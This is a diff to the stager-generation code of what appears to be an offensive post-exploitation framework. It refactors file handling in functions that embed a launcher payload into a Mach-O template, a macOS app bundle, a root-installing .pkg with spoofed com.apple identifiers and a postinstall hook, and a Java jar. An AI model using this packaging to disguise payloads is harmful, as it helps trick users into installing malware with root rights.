@@ -204,29 +204,28 @@ class Stagers(object):
         """
 
         MH_EXECUTE = 2
-        f = open("%s/data/misc/machotemplate" % (self.mainMenu.installPath), 'rb')
-        # f = open(self.installPath + "/data/misc/machotemplate", 'rb')
-        macho = macholib.MachO.MachO(f.name)
+        # with open(self.installPath + "/data/misc/machotemplate", 'rb') as f:
+        with open("%s/data/misc/machotemplate" % (self.mainMenu.installPath), 'rb') as f:
+            macho = macholib.MachO.MachO(f.name)
 
-        if int(macho.headers[0].header.filetype) != MH_EXECUTE:
-            print(helpers.color("[!] Macho binary template is not the correct filetype"))
-            return ""
+            if int(macho.headers[0].header.filetype) != MH_EXECUTE:
+                print(helpers.color("[!] Macho binary template is not the correct filetype"))
+                return ""
 
-        cmds = macho.headers[0].commands
+            cmds = macho.headers[0].commands
 
-        for cmd in cmds:
-            count = 0
-            if int(cmd[count].cmd) == macholib.MachO.LC_SEGMENT_64:
-                count += 1
-                if cmd[count].segname.strip(b'\x00') == b'__TEXT' and cmd[count].nsects > 0:
+            for cmd in cmds:
+                count = 0
+                if int(cmd[count].cmd) == macholib.MachO.LC_SEGMENT_64:
                     count += 1
-                    for section in cmd[count]:
-                        if section.sectname.strip(b'\x00') == b'__cstring':
-                            offset = int(section.offset) + (int(section.size) - 2119)
-                            placeHolderSz = int(section.size) - (int(section.size) - 2119)
+                    if cmd[count].segname.strip(b'\x00') == b'__TEXT' and cmd[count].nsects > 0:
+                        count += 1
+                        for section in cmd[count]:
+                            if section.sectname.strip(b'\x00') == b'__cstring':
+                                offset = int(section.offset) + (int(section.size) - 2119)
+                                placeHolderSz = int(section.size) - (int(section.size) - 2119)
 
-        template = f.read()
-        f.close()
+            template = f.read()
 
         if placeHolderSz and offset:
 
@@ -416,16 +415,14 @@ class Stagers(object):
 </dict>
 </plist>
 """ % (AppName, iconfile, AppName, AppName)
-            f = open(tmpdir+"Contents/Info.plist", "w")
-            f.write(appPlist)
-            f.close()
+            with open(tmpdir+"Contents/Info.plist", "w") as f:
+                f.write(appPlist)
 
             shutil.make_archive("/tmp/launcher", 'zip', "/tmp/application")
             shutil.rmtree('/tmp/application')
 
-            f = open("/tmp/launcher.zip","rb")
-            zipbundle = f.read()
-            f.close()
+            with open("/tmp/launcher.zip","rb") as f:
+                zipbundle = f.read()
             os.remove("/tmp/launcher.zip")
             return zipbundle
 
@@ -438,9 +435,8 @@ class Stagers(object):
         #unzip application bundle zip. Copy everything for the installer pkg to a temporary location
         currDir = os.getcwd()
         os.chdir("/tmp/")
-        f = open("app.zip","wb")
-        f.write(bundleZip)
-        f.close()
+        with open("app.zip","wb") as f:
+            f.write(bundleZip)
         zipf = zipfile.ZipFile('app.zip','r')
         zipf.extractall()
         zipf.close()
@@ -453,61 +449,58 @@ class Stagers(object):
         subprocess.call("( cd root && find . | cpio -o --format odc --owner 0:80 | gzip -c ) > expand/Payload", shell=True, stderr=subprocess.DEVNULL)
 
         os.system("chmod +x expand/Payload")
-        s = open('scripts/postinstall','r+')
-        script = s.read()
-        script = script.replace('LAUNCHER',launcher)
-        s.seek(0)
-        s.write(script)
-        s.close()
+        with open('scripts/postinstall','r+') as s:
+            script = s.read()
+            script = script.replace('LAUNCHER',launcher)
+            s.seek(0)
+            s.write(script)
         subprocess.call("( cd scripts && find . | cpio -o --format odc --owner 0:80 | gzip -c ) > expand/Scripts", shell=True, stderr=subprocess.DEVNULL)
         os.system("chmod +x expand/Scripts")
         numFiles = subprocess.check_output("find root | wc -l",shell=True).strip(b'\n')
         size = subprocess.check_output("du -b -s root",shell=True).split(b'\t')[0]
         size = old_div(int(size), 1024)
-        p = open('expand/PackageInfo','w+')
-        pkginfo = """<?xml version="1.0" encoding="utf-8" standalone="no"?>
-<pkg-info overwrite-permissions="true" relocatable="false" identifier="com.apple.APPNAME" postinstall-action="none" version="1.0" format-version="2" generator-version="InstallCmds-554 (15G31)" install-location="/" auth="root">
-    <payload numberOfFiles="KEY1" installKBytes="KEY2"/>
-    <bundle path="./APPNAME.app" id="com.apple.APPNAME" CFBundleShortVersionString="1.0" CFBundleVersion="1"/>
-    <bundle-version>
-        <bundle id="com.apple.APPNAME"/>
-    </bundle-version>
-    <upgrade-bundle>
-        <bundle id="com.apple.APPNAME"/>
-    </upgrade-bundle>
-    <update-bundle/>
-    <atomic-update-bundle/>
-    <strict-identifier>
-        <bundle id="com.apple.APPNAME"/>
-    </strict-identifier>
-    <relocate>
-        <bundle id="com.apple.APPNAME"/>
-    </relocate>
-    <scripts>
-        <postinstall file="./postinstall"/>
-    </scripts>
-</pkg-info>
-"""
-        pkginfo = pkginfo.replace('APPNAME',AppName)
-        pkginfo = pkginfo.replace('KEY1',numFiles.decode('UTF-8'))
-        pkginfo = pkginfo.replace('KEY2',str(size))
-        p.write(pkginfo)
-        p.close()
+        with open('expand/PackageInfo','w+') as p:
+            pkginfo = """<?xml version="1.0" encoding="utf-8" standalone="no"?>
+    <pkg-info overwrite-permissions="true" relocatable="false" identifier="com.apple.APPNAME" postinstall-action="none" version="1.0" format-version="2" generator-version="InstallCmds-554 (15G31)" install-location="/" auth="root">
+        <payload numberOfFiles="KEY1" installKBytes="KEY2"/>
+        <bundle path="./APPNAME.app" id="com.apple.APPNAME" CFBundleShortVersionString="1.0" CFBundleVersion="1"/>
+        <bundle-version>
+            <bundle id="com.apple.APPNAME"/>
+        </bundle-version>
+        <upgrade-bundle>
+            <bundle id="com.apple.APPNAME"/>
+        </upgrade-bundle>
+        <update-bundle/>
+        <atomic-update-bundle/>
+        <strict-identifier>
+            <bundle id="com.apple.APPNAME"/>
+        </strict-identifier>
+        <relocate>
+            <bundle id="com.apple.APPNAME"/>
+        </relocate>
+        <scripts>
+            <postinstall file="./postinstall"/>
+        </scripts>
+    </pkg-info>
+    """
+            pkginfo = pkginfo.replace('APPNAME',AppName)
+            pkginfo = pkginfo.replace('KEY1',numFiles.decode('UTF-8'))
+            pkginfo = pkginfo.replace('KEY2',str(size))
+            p.write(pkginfo)
         os.system("mkbom -u 0 -g 80 root expand/Bom")
         os.system("chmod +x expand/Bom")
         os.system("chmod -R 755 expand/")
         os.system('( cd expand && xar --compression none -cf "../launcher.pkg" * )')
-        f = open('launcher.pkg','rb')
-        package = f.read()
+        with open('launcher.pkg','rb') as f:
+            package = f.read()
         os.chdir("/tmp/")
         shutil.rmtree('pkgbuild')
         shutil.rmtree(AppName+".app")
         return package
 
     def generate_jar(self, launcherCode):
-        file = open(self.mainMenu.installPath+'/data/misc/Run.java', 'r')
-        javacode = file.read()
-        file.close()
+        with open(self.mainMenu.installPath+'/data/misc/Run.java', 'r') as f:
+            javacode = f.read()
         javacode = javacode.replace("LAUNCHER", launcherCode)
         jarpath = self.mainMenu.installPath + '/data/misc/classes/com/installer/apple/'
         try:
@@ -518,16 +511,14 @@ class Stagers(object):
             else:
                 pass
 
-        file = open(jarpath+'Run.java', 'w')
-        file.write(javacode)
-        file.close()
+        with open(jarpath+'Run.java', 'w') as f:
+            f.write(javacode)
         os.system('javac ' + self.mainMenu.installPath + '/data/misc/classes/com/installer/apple/Run.java')
         os.system('jar -cfe ' + self.mainMenu.installPath + '/data/misc/Run.jar com.installer.apple.Run ' + self.mainMenu.installPath + '/data/misc/classes/com/installer/apple/Run.class')
         os.remove(self.mainMenu.installPath + '/data/misc/classes/com/installer/apple/Run.class')
         os.remove(self.mainMenu.installPath + '/data/misc/classes/com/installer/apple/Run.java')
-        jarfile = open(self.mainMenu.installPath + '/data/misc/Run.jar', 'rb')
-        jar = jarfile.read()
-        jarfile.close()
+        with open(self.mainMenu.installPath + '/data/misc/Run.jar', 'rb') as jarfile:
+            jar = jarfile.read()
         os.remove(self.mainMenu.installPath + '/data/misc/Run.jar')
 
         return jar
